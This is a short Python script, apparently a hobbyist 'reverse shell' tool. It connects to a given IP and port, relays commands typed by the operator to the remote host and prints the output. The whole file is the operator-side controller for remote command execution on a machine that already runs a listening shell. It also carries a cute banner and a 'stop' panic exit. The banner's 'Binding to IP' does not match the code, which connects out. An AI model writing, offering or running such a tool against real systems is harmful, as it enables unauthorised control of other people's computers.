
import sys 
import socket
import os
import subprocess
from datetime import datetime 

#Allow 3 arguments
if len(sys.argv) == 3:
    target =  socket.gethostbyname(sys.argv[1]) #resolves to ipv4
    p = int(sys.argv[2]) #makes second argument to integer for port

else: #if bad things happen from launch
	print('Invalid amount of arguments.')
	print('Syntax: python3 reverseShell.py <ip> <port>')
	sys.exit()


#cute little banner
print('-' * 50)
print('Super Simple Reverse Shell!')
print('Binding to IP: {}| Port: {}'.format(target,p))
print('Time Started: '+str(datetime.now()))
print('-' * 50)

def main():
 
    global s 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create socket
    
    
    s.connect((target,p))
    
    print('Connection successful!') #indicates successful connection to target
    
    command(s)
    s.close()
        
    
        
#function for commands   
def command(c):

    while True: 
    
        comm = input() #allows commands
        
        if comm == 'stop': #panic button
            s.close()
            sys.exit()
            
        if len(str.encode(comm)) > 0:
            s.send(str.encode(comm)) #sends command to target
            textRecieved = str(s.recv(1024).decode('utf-8')) 
            print(textRecieved, end='') #allows entry at the end of a lin
	
main()
    

